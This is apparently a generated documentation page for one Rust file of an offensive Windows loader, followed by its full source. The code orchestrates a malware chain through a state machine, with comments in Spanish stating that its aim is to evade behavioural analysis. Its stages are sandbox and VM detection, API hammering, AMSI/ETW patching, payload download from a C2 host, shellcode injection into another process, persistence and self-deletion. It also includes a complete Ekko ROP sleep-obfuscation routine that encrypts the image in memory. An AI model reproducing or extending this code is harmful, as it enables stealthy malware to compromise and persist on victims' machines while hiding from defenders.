# crowd — fsm.rs  (🅱️ B TIER — finite state machine orchestrator)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/fsm.rs` |
| **Lines** | 445 |
| **Tier** | F |
| **Cards** | T022-architecture |
| **Role** | 10-state FSM engine |
| **Unsafe blocks** | 5 |
| **Feature gates** | megadebug |

## Purpose

# crowd — fsm.rs  (🅱️ B TIER — finite state machine orchestrator)

## Finite State Machine (FSM) Execution Engine

Refactorización del flujo lineal a un motor de estados asíncrono
para evadir heurísticas de ventana de tiempo y análisis de comportamiento.

## Types

### enum `EvasionState` (line 16)

### struct `ExecutionContext` (line 45)
Contexto de ejecución que persiste entre estados.
Este contexto debe ser cifrado en memoria durante los estados de reposo.

### struct `TargetInfo` (line 63)

### struct `FsmDispatcher` (line 173)

## Public API

### `new` (line 70)
```rust
pub fn new(config: ChainConfig) -> Self
```

### `obfuscate` (line 88)
```rust
pub fn obfuscate(&mut self)
```
Cifra/Descifra campos flat del contexto (payload_buffer + aes_key).
NEVER XOR the full ChainConfig struct — it contains String/Vec/Option
with heap pointers that get corrupted by raw byte XOR.

### `secure_wipe` (line 97)
```rust
pub fn secure_wipe(&mut self)
```

### `next_state` (line 152)
```rust
pub fn next_state(current: EvasionState, success: bool) -> EvasionState
```
Transición lógica: Decide cuál es el siguiente estado basado en el resultado del actual.

### `new` (line 179)
```rust
pub fn new(config: ChainConfig) -> Self
```

### `run` (line 188)
```rust
pub fn run(&mut self)
```
Ejecuta el ciclo de vida de la FSM de forma asíncrona.

## Internal Functions

- `wipe_string` (line 102)
- `execute_state_logic` (line 219)
- `async_sleep_and_obfuscate` — Implementación completa de Ekko para la FSM. (line 324)

## Key Dependencies

- `use crate::chain::ChainConfig;`
- `use rand::Rng;`
- `use winapi::um::winnt::CONTEXT;`
- `use winapi::um::synchapi::CreateEventW;`
- `use winapi::um::winnt::HANDLE;`
- `use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};`
- `use winapi::um::synchapi::{CreateEventW, WaitForSingleObject};`
- `use winapi::um::threadpoollegacyapiset::{CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx};`
- `use winapi::um::winnt::{`

## Full Source

```rust
//! # crowd — fsm.rs  (🅱️ B TIER — finite state machine orchestrator)
//!
//! ## Finite State Machine (FSM) Execution Engine
//!
//! Refactorización del flujo lineal a un motor de estados asíncrono
//! para evadir heurísticas de ventana de tiempo y análisis de comportamiento.

use crate::chain::ChainConfig;
use rand::Rng;
use std::mem;
use std::ptr::null_mut;
use winapi::um::winnt::CONTEXT;

/// Estados de la máquina de evasión.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EvasionState {
    /// Inicio y preparación del contexto.
    Init,
    /// Verificaciones Anti-VM / Anti-Sandbox.
    AntiVM,
    /// API Hammering para dilatar el tiempo de análisis.
    Hammering,
    /// AMSI / ETW patching via Hardware Breakpoints o parches.
    Patching,
    /// Descarga o carga del payload real.
    Loading,
    /// Descifrado y desempaquetado (AES-GCM / zstd).
    Decrypting,
    /// Configuración de ejecución (PPID, Spoofing, Overloading).
    Setup,
    /// Inyección de shellcode en el proceso target.
    Injection,
    /// Persistencia (COM, NTFS EA, SchedTask).
    Persistence,
    /// Limpieza de rastros y auto-borrado.
    Cleanup,
    /// Estado final exitoso.
    Finished,
    /// Estado de "emergencia" (bucle benigno si falla un check).
    BailOut,
}

/// Contexto de ejecución que persiste entre estados.
/// Este contexto debe ser cifrado en memoria durante los estados de reposo.
pub struct ExecutionContext {
    /// Estado actual de la FSM.
    pub current_state: EvasionState,
    /// Configuración de la cadena.
    pub config: ChainConfig,
    /// Buffer del payload (ya sea crudo, cifrado o procesado).
    pub payload_buffer: Vec<u8>,
    /// AES Key persistente.
    pub aes_key: [u8; 32],
    /// Información del proceso target (PID, handles).
    pub target_info: TargetInfo,
    /// Contexto de CPU capturado para transiciones asíncronas.
    pub _cpu_context: CONTEXT,
    /// Semilla para la obfuscación del contexto.
    pub obfuscation_key: [u8; 16],
}

#[derive(Default)]
pub struct TargetInfo {
    pub pid: u32,
    pub process_handle: *mut winapi::ctypes::c_void,
    pub thread_handle: *mut winapi::ctypes::c_void,
}

impl ExecutionContext {
    pub fn new(config: ChainConfig) -> Self {
        let mut key = [0u8; 16];
        rand::thread_rng().fill(&mut key[..]);

        Self {
            current_state: EvasionState::Init,
            config,
            payload_buffer: Vec::new(),
            aes_key: [0u8; 32],
            target_info: TargetInfo::default(),
            _cpu_context: unsafe { mem::zeroed() },
            obfuscation_key: key,
        }
    }

    /// Cifra/Descifra campos flat del contexto (payload_buffer + aes_key).
    /// NEVER XOR the full ChainConfig struct — it contains String/Vec/Option
    /// with heap pointers that get corrupted by raw byte XOR.
    pub fn obfuscate(&mut self) {
        for (i, b) in self.payload_buffer.iter_mut().enumerate() {
            *b ^= self.obfuscation_key[i % 16];
        }
        for (i, b) in self.aes_key.iter_mut().enumerate() {
            *b ^= self.obfuscation_key[i % 16];
        }
    }

    pub fn secure_wipe(&mut self) {
        crate::crypto::secure_zero_memory(&mut self.payload_buffer);
        crate::crypto::secure_zero_slice(&mut self.aes_key);

        // Zero sensitive string contents in their heap buffers
        fn wipe_string(s: &mut String) {
            unsafe {
                let buf = s.as_bytes_mut();
                crate::crypto::secure_zero_slice(buf);
            }
            s.clear();
        }
        wipe_string(&mut self.config.payload_path);
        wipe_string(&mut self.config.c2_host);
        wipe_string(&mut self.config.c2_path);
        wipe_string(&mut self.config.decoy_args);
        wipe_string(&mut self.config.real_args);
        wipe_string(&mut self.config.stomp_dll);
        wipe_string(&mut self.config.stomp_export);

        if let Some(ref mut dll) = self.config.overload_target_dll {
            wipe_string(dll);
        }
        self.config.overload_target_dll = None;

        if let Some(ref mut p_cfg) = self.config.persist_cfg {
            wipe_string(&mut p_cfg.com_clsid);
            wipe_string(&mut p_cfg.c2_url);
            if let Some(ref mut task) = p_cfg.task_name {
                wipe_string(task);
            }
            p_cfg.task_name = None;
            if let Some(ref mut dll) = p_cfg.tls_target_dll {
                wipe_string(dll);
            }
            p_cfg.tls_target_dll = None;
        }
        self.config.persist_cfg = None;

        crate::crypto::secure_zero_slice(&mut self.config.aes_key);

        // Prevent String/Vec destructors from running on zeroed memory:
        // replace config with a fresh Default (valid heap pointers) then
        // zero only the flat aes_key field.
        let old = mem::replace(&mut self.config, ChainConfig::default());
        mem::forget(old); // heap buffers already wiped above
        crate::crypto::secure_zero_slice(&mut self.config.aes_key);
    }
}

use std::sync::{Arc, Mutex};
use winapi::um::synchapi::CreateEventW;
use winapi::um::winnt::HANDLE;

/// Transición lógica: Decide cuál es el siguiente estado basado en el resultado del actual.
pub fn next_state(current: EvasionState, success: bool) -> EvasionState {
    if !success {
        return EvasionState::BailOut;
    }

    match current {
        EvasionState::Init        => EvasionState::AntiVM,
        EvasionState::AntiVM      => EvasionState::Hammering,
        EvasionState::Hammering   => EvasionState::Patching,
        EvasionState::Patching    => EvasionState::Loading,
        EvasionState::Loading     => EvasionState::Decrypting,
        EvasionState::Decrypting  => EvasionState::Setup,
        EvasionState::Setup       => EvasionState::Injection,
        EvasionState::Injection   => EvasionState::Cleanup,
        EvasionState::Cleanup     => EvasionState::Persistence,
        EvasionState::Persistence => EvasionState::Finished,
        EvasionState::Finished    => EvasionState::Finished,
        EvasionState::BailOut     => EvasionState::BailOut, // Bucle infinito benigno
    }
}

pub struct FsmDispatcher {
    pub context: Arc<Mutex<ExecutionContext>>,
    pub transition_event: HANDLE,
}

impl FsmDispatcher {
    pub fn new(config: ChainConfig) -> Self {
        let event = unsafe { CreateEventW(null_mut(), 0, 0, null_mut()) };
        Self {
            context: Arc::new(Mutex::new(ExecutionContext::new(config))),
            transition_event: event,
        }
    }

    /// Ejecuta el ciclo de vida de la FSM de forma asíncrona.
    pub fn run(&mut self) {
        loop {
            let mut ctx = self.context.lock().unwrap();
            let current = ctx.current_state;

            if current == EvasionState::Finished || current == EvasionState::BailOut {
                break;
            }

            // 1. Ejecutar la lógica del estado actual
            let success = self.execute_state_logic(&mut ctx);

            // 2. Transición al siguiente estado
            let next = next_state(current, success);
            ctx.current_state = next;

            if next == EvasionState::Finished {
                break;
            }

            // 3. Dormir y ofuscar el contexto entre estados
            drop(ctx); // Liberar lock antes de dormir
            // En megadebug: skip Ekko ROP (causaría race conditions con delays muy cortos)
            // Usamos thread::sleep simple para no interferir con el flujo
            #[cfg(feature = "megadebug")]
            std::thread::sleep(std::time::Duration::from_millis(10));
            #[cfg(not(feature = "megadebug"))]
            self.async_sleep_and_obfuscate(5000); // 5 segundos Ekko entre estados
        }
    }

    fn execute_state_logic(&self, ctx: &mut ExecutionContext) -> bool {
        let state_name = format!("{:?}", ctx.current_state);

        // ── Timing start (no-op si no es megadebug) ──────────────────────────
        #[cfg(feature = "megadebug")]
        let t_start = std::time::Instant::now();

        let result = match ctx.current_state {
            EvasionState::Init => {
                #[cfg(feature = "megadebug")]
                {
                    crate::debug_log::dump_config(&ctx.config);
                    crate::mega_dbg!("Init: payload_buf initial size: {}B", ctx.payload_buffer.len());
                    crate::mega_dbg!("Init: Inicializando mapa de syscalls para RecycledGate...");
                }
                crate::syscall_map::syscall_map();

                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("Init: Aplicando Block-DLL policy...");
                unsafe { let _ = crate::policy::apply_block_dll_policy(); }
                true
            }
            EvasionState::AntiVM => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("AntiVM: CPUID+RDTSC+MAC+Cores+RAM checks");
                crate::anti_vm::check_all_fsm(ctx)
            }
            EvasionState::Hammering => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("Hammering: seed=0x{:x} iters={} min_secs={}",
                    ctx.config.hammer_seed, ctx.config.hammer_iters, ctx.config.hammer_min_secs);
                crate::hammering::run_fsm(ctx)
            }
            EvasionState::Patching => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("Patching: AMSI-HBP via DR0 + ETW muffle");
                crate::amsi_hbp::patch_fsm(ctx)
            }
            EvasionState::Loading => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("Loading: c2_host='{}' path='{}' port={}",
                    ctx.config.c2_host, ctx.config.c2_path, ctx.config.c2_port);
                crate::winhttp_dl::load_payload_fsm(ctx)
            }
            EvasionState::Decrypting => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("Decrypting: payload_buf={}B key_set={}",
                    ctx.payload_buffer.len(),
                    ctx.config.aes_key.iter().any(|&b| b != 0));
                crate::chain::decrypt_fsm(ctx)
            }
            EvasionState::Setup => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("Setup: ppid={:?} overload_dll={:?} threadless={}",
                    ctx.config.ppid_parent,
                    ctx.config.overload_target_dll,
                    ctx.config.use_threadless);
                crate::chain::setup_fsm(ctx)
            }
            EvasionState::Injection => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("Injection: target_pid={:?} payload={}B",
                    ctx.config.target_pid, ctx.payload_buffer.len());
                crate::chain::inject_fsm(ctx)
            }
            EvasionState::Persistence => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("Persistence: persist={} clsid={}",
                    ctx.config.persist,
                    ctx.config.persist_cfg.as_ref().map(|p| p.com_clsid.as_str()).unwrap_or("<none>"));
                crate::chain::persistence_fsm(ctx)
            }
            EvasionState::Cleanup => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("Cleanup: self_delete={} peb_unlink={} sleep_ms={}",
                    ctx.config.self_delete, ctx.config.peb_unlink, ctx.config.sleep_ms);
                crate::chain::cleanup_fsm(ctx)
            }
            EvasionState::Finished => true,
            EvasionState::BailOut => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("BailOut: exiting FSM");
                false
            }
        };

        // ── Emitir resultado con timing ────────────────────────────────────────
        #[cfg(feature = "megadebug")]
        {
            let elapsed = t_start.elapsed().as_millis();
            let detail = if result {
                format!("OK — payload_buf={}B", ctx.payload_buffer.len())
            } else {
                format!("FAIL — target_pid={:?} state={:?}",
                    ctx.target_info.pid, ctx.current_state)
            };
            crate::phase_log!(&state_name, result, elapsed, &detail);
        }

        result
    }


    /// Implementación completa de Ekko para la FSM.
    /// Obfusca tanto la imagen en memoria como el propio contexto de ejecución.
    fn async_sleep_and_obfuscate(&self, ms: u32) {
        use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
        use winapi::um::synchapi::{CreateEventW, WaitForSingleObject};
        use winapi::um::threadpoollegacyapiset::{CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx};
        use winapi::um::winnt::{
            CONTEXT, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, WT_EXECUTEINTIMERTHREAD,
            WAITORTIMERCALLBACK,
        };

        unsafe {
            let h_ntdll = GetModuleHandleA("ntdll\0".as_ptr() as *const i8);
            let h_k32   = GetModuleHandleA("kernel32.dll\0".as_ptr() as *const i8);
            let h_adv   = LoadLibraryA("Advapi32.dll\0".as_ptr() as *const i8);

            let nt_continue        = GetProcAddress(h_ntdll, "NtContinue\0".as_ptr() as *const i8) as u64;
            let sys_func032        = GetProcAddress(h_adv,   "SystemFunction032\0".as_ptr() as *const i8) as u64;
            let virt_protect       = GetProcAddress(h_k32,   "VirtualProtect\0".as_ptr() as *const i8) as u64;
            let wait_single_obj    = GetProcAddress(h_k32,   "WaitForSingleObject\0".as_ptr() as *const i8) as u64;
            let set_event_fn       = GetProcAddress(h_k32,   "SetEvent\0".as_ptr() as *const i8) as u64;

            if [nt_continue, sys_func032, virt_protect, wait_single_obj, set_event_fn].iter().any(|&p| p == 0) {
                winapi::um::synchapi::Sleep(ms);
                return;
            }

            let h_timer_queue = CreateTimerQueue();
            let h_event       = CreateEventW(null_mut(), 0, 0, null_mut());

            if h_timer_queue.is_null() || h_event.is_null() {
                winapi::um::synchapi::Sleep(ms);
                return;
            }

            // --- Calcular imagen ---
            let image_base = GetModuleHandleA(null_mut()) as *mut winapi::ctypes::c_void;
            let dos        = image_base as *const IMAGE_DOS_HEADER;
            let nt         = (image_base as u64 + (*dos).e_lfanew as u64) as *const IMAGE_NT_HEADERS64;
            let image_size = (*nt).OptionalHeader.SizeOfImage;

            // --- Preparar UStrings para imagen y contexto ---
            let mut ctx = self.context.lock().unwrap();
            
            // 0. Ofuscar el buffer del payload manualmente (XOR) antes de la cadena ROP
            ctx.obfuscate();

            // Heap-allocate ROP data outside the PE image range.
            // Stack locals live inside the image and get RC4-encrypted by the ROP chain.
            let mut key_data = Box::new(ctx.obfuscation_key);
            let key_ustr = Box::new(crate::sleep::UString {
                length: 16,
                max_length: 16,
                buffer: key_data.as_mut_ptr() as *mut _,
            });

            let mut img_ustr = Box::new(crate::sleep::UString {
                length: image_size,
                max_length: image_size,
                buffer: image_base,
            });

            drop(ctx);

            // --- Frames ROP ---
            // NOTE: Removed RC4 encryption of ExecutionContext (ctx_ustr) — it contains
            // Rust String/Vec/Option with heap pointers that would be corrupted by RC4.
            // The obfuscate() XOR on payload_buffer+aes_key above is sufficient.
            let mut ctx_thread: CONTEXT = mem::zeroed();
            #[allow(unused_assignments)]
            let (mut rop_prot_rw, mut rop_enc_img, mut rop_delay,
                 mut rop_dec_img, mut rop_prot_rx, mut rop_set_evt)
                = (mem::zeroed(), mem::zeroed(), mem::zeroed(),
                   mem::zeroed(), mem::zeroed(), mem::zeroed());

            let rtl_capture_context: WAITORTIMERCALLBACK = std::mem::transmute(GetProcAddress(h_ntdll, "RtlCaptureContext\0".as_ptr() as *const i8));
            CreateTimerQueueTimer(&mut null_mut(), h_timer_queue, rtl_capture_context, &mut ctx_thread as *mut _ as *mut _, 0, 0, WT_EXECUTEINTIMERTHREAD);
            WaitForSingleObject(h_event, 50);

            let mut old_prot: Box<u32> = Box::new(0);
            let nc: WAITORTIMERCALLBACK = std::mem::transmute(nt_continue);

            // VirtualProtect(RW)
            rop_prot_rw = ctx_thread; rop_prot_rw.Rsp -= 8; rop_prot_rw.Rip = virt_protect;
            rop_prot_rw.Rcx = image_base as u64; rop_prot_rw.Rdx = image_size as u64; rop_prot_rw.R8 = 0x04; rop_prot_rw.R9 = &mut *old_prot as *mut _ as u64;

            // Encrypt Image
            rop_enc_img = ctx_thread; rop_enc_img.Rsp -= 8; rop_enc_img.Rip = sys_func032;
            rop_enc_img.Rcx = &mut *img_ustr as *mut _ as u64; rop_enc_img.Rdx = &*key_ustr as *const _ as u64;

            // Delay
            rop_delay = ctx_thread; rop_delay.Rsp -= 8; rop_delay.Rip = wait_single_obj;
            rop_delay.Rcx = -1isize as u64; rop_delay.Rdx = ms as u64;

            // Decrypt Image
            rop_dec_img = ctx_thread; rop_dec_img.Rsp -= 8; rop_dec_img.Rip = sys_func032;
            rop_dec_img.Rcx = &mut *img_ustr as *mut _ as u64; rop_dec_img.Rdx = &*key_ustr as *const _ as u64;

            // VirtualProtect(RX)
            rop_prot_rx = ctx_thread; rop_prot_rx.Rsp -= 8; rop_prot_rx.Rip = virt_protect;
            rop_prot_rx.Rcx = image_base as u64; rop_prot_rx.Rdx = image_size as u64; rop_prot_rx.R8 = 0x20; rop_prot_rx.R9 = &mut *old_prot as *mut _ as u64;

            // Set Event
            rop_set_evt = ctx_thread; rop_set_evt.Rsp -= 8; rop_set_evt.Rip = set_event_fn;
            rop_set_evt.Rcx = h_event as u64;

            let timers = [
                (&rop_prot_rw, 100),
                (&rop_enc_img, 200),
                (&rop_delay,   300),
                (&rop_dec_img, 300 + ms + 100),
                (&rop_prot_rx, 300 + ms + 200),
                (&rop_set_evt, 300 + ms + 300),
            ];

            for (c, d) in timers {
                CreateTimerQueueTimer(&mut null_mut(), h_timer_queue, nc, c as *const _ as *mut _, d, 0, WT_EXECUTEINTIMERTHREAD);
            }

            WaitForSingleObject(h_event, winapi::um::winbase::INFINITE);
            DeleteTimerQueueEx(h_timer_queue, null_mut());
        }
    }
}

```